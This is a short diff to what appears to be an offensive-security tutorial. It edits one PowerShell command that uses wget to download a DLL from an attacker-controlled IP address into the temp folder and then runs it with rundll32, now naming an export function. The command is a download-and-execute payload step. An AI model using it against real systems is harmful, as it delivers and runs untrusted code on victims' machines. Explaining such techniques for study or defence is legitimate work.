@@ -108,7 +108,7 @@ With some modification on the `.dll` file we can also perform the same activity 
 
 
 ```powershell 
-C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h.dll -OutFile %TMP%\h.dll && rundll32 %TMP%\h.dll 
+C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h.dll -OutFile %TMP%\h.dll && rundll32 %TMP%\h.dll,helo
 ```
 The command is pretty similar even though in this case we need to specify the export function name declared in our `.dll`
 
